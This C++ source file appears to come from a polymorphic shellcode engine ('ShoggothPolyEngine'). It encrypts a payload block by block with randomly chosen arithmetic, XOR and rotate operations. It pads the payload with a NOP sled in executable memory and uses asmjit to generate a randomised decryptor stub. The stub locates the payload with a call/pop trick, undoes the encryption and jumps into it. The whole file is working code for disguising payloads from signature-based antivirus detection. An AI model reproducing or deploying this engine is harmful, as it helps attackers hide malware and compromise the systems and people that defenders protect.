#include "SecondEncryption.h"


PBYTE ShoggothPolyEngine::SecondEncryption(PBYTE plainPayload, int payloadSize, int& newPayloadSize) {
    uint64_t* blockCursor = NULL;
    this->numberOfBlocks = (payloadSize / BLOCK_SIZE);
    PBYTE encryptedArea = NULL;
    if (payloadSize % BLOCK_SIZE) {
        this->numberOfBlocks++;
    }
    newPayloadSize = this->numberOfBlocks * BLOCK_SIZE;
    encryptedArea = (PBYTE)VirtualAlloc(NULL, newPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(encryptedArea, plainPayload, payloadSize);
    // Put nop sled
    // This should be 0 for only decrptor encrypt case
    memset(encryptedArea + payloadSize, 0x90, (payloadSize % BLOCK_SIZE ? BLOCK_SIZE - payloadSize % BLOCK_SIZE : 0));
    blockCursor = (uint64_t*)encryptedArea;
    this->addressHolderForSecondEncryption = this->GetRandomGeneralPurposeRegister();
    this->firstAddressHolderForSecondEncryption = this->addressHolderForSecondEncryption;
    this->encryptListForBlocks = (ENCRYPT_TYPE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(ENCRYPT_TYPE) * this->numberOfBlocks);
    for (int i = 0; i < this->numberOfBlocks; i++) {
        if (RandomizeInRange(1, 6) == 3) {
            this->ChangeAddressHolder(&(this->encryptListForBlocks[i]));
        }
        else {
            this->encryptListForBlocks[i].changeSourceRegister = false;
        }
        this->GetRandomSecondEncryption(&(this->encryptListForBlocks[i]));
        this->ApplyRandomSecondEncryption(blockCursor, &(this->encryptListForBlocks[i]));
        blockCursor++;
    }
    return encryptedArea;
}

PBYTE ShoggothPolyEngine::SecondDecryptor(PBYTE encryptedPayload, int payloadSize, int& secondDecryptorBlockSize) {
    // Garbage + callto pop + garbage + payload + pop + garbage + decipherstep
    int callStubSize = 0;
    int firstGarbageSize = 0;
    int popStubSize = 0;
    int secondGarbageSize = 0;
    int decryptorStubSize = 0;
    PBYTE returnPtr = NULL;
    PBYTE callStub = this->GetCallInstructionOverPayload(payloadSize, callStubSize);
    PBYTE popStub = this->GetPopInstructionAfterPayload(popStubSize);
    // TODO add garbage if it is required
    PBYTE decryptorStub = this->GenerateSecondDecryptorStub(decryptorStubSize, secondGarbageSize);

    returnPtr = (PBYTE)VirtualAlloc(NULL, callStubSize + payloadSize + popStubSize + decryptorStubSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(returnPtr + secondDecryptorBlockSize, callStub, callStubSize);
    secondDecryptorBlockSize += callStubSize;
    memcpy(returnPtr + secondDecryptorBlockSize, encryptedPayload, payloadSize);
    secondDecryptorBlockSize += payloadSize;
    memcpy(returnPtr + secondDecryptorBlockSize, popStub, popStubSize);
    secondDecryptorBlockSize += popStubSize;
    memcpy(returnPtr + secondDecryptorBlockSize, decryptorStub, decryptorStubSize);
    secondDecryptorBlockSize += decryptorStubSize;
    this->asmjitRuntime.release(callStub);
    this->asmjitRuntime.release(popStub);
    this->asmjitRuntime.release(decryptorStub);
    return returnPtr;
}


PBYTE ShoggothPolyEngine::GenerateSecondDecryptorStub(int& decryptorStubSize, int offsetToEncryptedPayload) {
    int currentBlockOffset = 0;
    this->addressHolderForSecondEncryption = this->firstAddressHolderForSecondEncryption;
    for (int i = 0; i < this->numberOfBlocks; i++,currentBlockOffset++) {
        if (this->encryptListForBlocks[i].changeSourceRegister) {
            if (RandomizeBool()) {
                asmjitAssembler->mov(this->encryptListForBlocks[i].newSourceRegister, this->encryptListForBlocks[i].oldSourceRegister);
               
            }
            else {
                asmjitAssembler->push(this->encryptListForBlocks[i].oldSourceRegister);
                asmjitAssembler->pop(this->encryptListForBlocks[i].newSourceRegister);
            }
            asmjitAssembler->add(this->encryptListForBlocks[i].newSourceRegister, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE));
            this->addressHolderForSecondEncryption = this->encryptListForBlocks[i].newSourceRegister;
            currentBlockOffset = 0;
        }
        switch (this->encryptListForBlocks[i].operation) {
        case ADD_OPERATION_FOR_CRYPT:
            if (this->encryptListForBlocks[i].isRegister) {
                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, this->encryptListForBlocks[i].operandValue);
                asmjitAssembler->sub(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandRegister);
            }
            else {
                asmjitAssembler->sub(x86::dword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandValue);
            }
            break;
        case SUB_OPERATION_FOR_CRYPT:
            if (this->encryptListForBlocks[i].isRegister) {
                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, this->encryptListForBlocks[i].operandValue);
                asmjitAssembler->add(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandRegister);
            }
            else {
                asmjitAssembler->add(x86::dword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandValue);
            }
            break;
        case XOR_OPERATION_FOR_CRYPT:
            if (this->encryptListForBlocks[i].isRegister) {
                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, this->encryptListForBlocks[i].operandValue);
                asmjitAssembler->xor_(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandRegister);
            }
            else {
                asmjitAssembler->xor_(x86::dword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandValue);
            }
            break;
        case NOT_OPERATION_FOR_CRYPT:
            if (this->encryptListForBlocks[i].isRegister) {
                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)));
                asmjitAssembler->not_(this->encryptListForBlocks[i].operandRegister);
                asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandRegister);
            }
            else {
                asmjitAssembler->not_(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)));
            }
            break;
        case NEG_OPERATION_FOR_CRYPT:
            if (this->encryptListForBlocks[i].isRegister) {
                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)));
                asmjitAssembler->neg(this->encryptListForBlocks[i].operandRegister);
                asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandRegister);
            }
            else {
                asmjitAssembler->neg(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)));
            }
            break;
        case INC_OPERATION_FOR_CRYPT:
            if (this->encryptListForBlocks[i].isRegister) {
                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)));
                asmjitAssembler->dec(this->encryptListForBlocks[i].operandRegister);
                asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandRegister);
            }
            else {
                asmjitAssembler->dec(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)));
            }
            break;
        case DEC_OPERATION_FOR_CRYPT:
            if (this->encryptListForBlocks[i].isRegister) {
                asmjitAssembler->mov(this->encryptListForBlocks[i].operandRegister, x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)));
                asmjitAssembler->inc(this->encryptListForBlocks[i].operandRegister);
                asmjitAssembler->mov(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandRegister);
            }
            else {
                asmjitAssembler->inc(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)));
            }
            break;
        case ROL_OPERATION_FOR_CRYPT: 
            asmjitAssembler->ror(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandValue);
            break;
        case ROR_OPERATION_FOR_CRYPT:
            asmjitAssembler->rol(x86::qword_ptr(this->addressHolderForSecondEncryption, offsetToEncryptedPayload + (currentBlockOffset * BLOCK_SIZE)), this->encryptListForBlocks[i].operandValue);
            break;
        }
    }
    asmjitAssembler->sub(this->addressHolderForSecondEncryption, (this->numberOfBlocks - currentBlockOffset) * BLOCK_SIZE);
    if (RandomizeBool()) {
        asmjitAssembler->jmp(this->addressHolderForSecondEncryption);
    }
    else {
        asmjitAssembler->push(this->addressHolderForSecondEncryption);
        asmjitAssembler->ret();
    }
    HeapFree(GetProcessHeap(), NULL, this->encryptListForBlocks);
    return this->AssembleCodeHolder(decryptorStubSize);
}


void ShoggothPolyEngine::GetRandomSecondEncryption(ENCRYPT_TYPE* encryptTypeHolder) {
    encryptTypeHolder->operation = (OPERATIONS)RandomizeInRange(0, 8);
    x86::Gp tempRegister = GetRandomGeneralPurposeRegister();
    while (addressHolderForSecondEncryption.id() == tempRegister.id()) {
        tempRegister = this->GetRandomGeneralPurposeRegister();
    }
    switch (encryptTypeHolder->operation) {
    case ADD_OPERATION_FOR_CRYPT:
    case SUB_OPERATION_FOR_CRYPT:
    case XOR_OPERATION_FOR_CRYPT:
        if ((encryptTypeHolder->isRegister = RandomizeBool())) {
            encryptTypeHolder->operandRegister = tempRegister;
            encryptTypeHolder->operandValue = RandomizeQWORD();
        }
        else {
            encryptTypeHolder->operandValue = RandomizeDWORD();
        }
        break;
    case NOT_OPERATION_FOR_CRYPT:
    case NEG_OPERATION_FOR_CRYPT:
    case INC_OPERATION_FOR_CRYPT:
    case DEC_OPERATION_FOR_CRYPT:
        if ((encryptTypeHolder->isRegister = RandomizeBool())) {
            encryptTypeHolder->operandRegister = tempRegister;
        }
        break;
    case ROL_OPERATION_FOR_CRYPT:
    case ROR_OPERATION_FOR_CRYPT:
        encryptTypeHolder->isRegister = false;
        encryptTypeHolder->operandValue = RandomizeInRange(1, 63);
        break;
    }
}

void ShoggothPolyEngine::ApplyRandomSecondEncryption(uint64_t* blockCursor, ENCRYPT_TYPE* encryptTypeHolder) {
    uint32_t temp1 = 0;
    uint32_t temp2 = 0;
    uint32_t temp3 = 0;
    uint64_t temp4 = 0;
    uint64_t temp5 = 0;
    switch (encryptTypeHolder->operation) {
    case ADD_OPERATION_FOR_CRYPT:
        if (encryptTypeHolder->isRegister) {
            *blockCursor = (*blockCursor + encryptTypeHolder->operandValue);
        }
        else {
            // Endiannes magic
            temp4 = *blockCursor;
            temp1 = *blockCursor;
            temp2 = encryptTypeHolder->operandValue;
            temp3 = ((temp1 + temp2));
            *blockCursor = temp3;
            temp5 = temp4 & 0xFFFFFFFF00000000;
            *blockCursor |= temp5;
        }
        break;
    case SUB_OPERATION_FOR_CRYPT:
        if (encryptTypeHolder->isRegister) {
            *blockCursor = (*blockCursor - encryptTypeHolder->operandValue);
        }
        else {
            // Endiannes magic
            temp4 = *blockCursor;
            temp1 = *blockCursor;
            temp2 = encryptTypeHolder->operandValue;
            temp3 = ((temp1 - temp2));
            *blockCursor = temp3;
            temp5 = temp4 & 0xFFFFFFFF00000000;
            *blockCursor |= temp5;
        }
        break;
    case XOR_OPERATION_FOR_CRYPT:
        *blockCursor = *blockCursor ^ encryptTypeHolder->operandValue;
        break;
    case NOT_OPERATION_FOR_CRYPT:
        *blockCursor = ~(*blockCursor);
        break;
    case NEG_OPERATION_FOR_CRYPT:
        *blockCursor = (uint64_t)(-(int64_t(*blockCursor)));
        break;
    case INC_OPERATION_FOR_CRYPT:
        *blockCursor = *blockCursor + 1;
        break;
    case DEC_OPERATION_FOR_CRYPT:
        *blockCursor = *blockCursor - 1;
        break;
    case ROL_OPERATION_FOR_CRYPT:
        *blockCursor = _rotl64(*blockCursor, encryptTypeHolder->operandValue);
        break;
    case ROR_OPERATION_FOR_CRYPT:
        *blockCursor = _rotr64(*blockCursor, encryptTypeHolder->operandValue);
        break;
    }
}

void ShoggothPolyEngine::ChangeAddressHolder(ENCRYPT_TYPE* encryptTypeHolder) {
    encryptTypeHolder->changeSourceRegister = true;
    encryptTypeHolder->oldSourceRegister = this->addressHolderForSecondEncryption;
    x86::Gp tempRegister = GetRandomGeneralPurposeRegister();
    while (this->addressHolderForSecondEncryption.id() == tempRegister.id()) {
        tempRegister = this->GetRandomGeneralPurposeRegister();
    }
    encryptTypeHolder->newSourceRegister = tempRegister;
    this->addressHolderForSecondEncryption = tempRegister;
}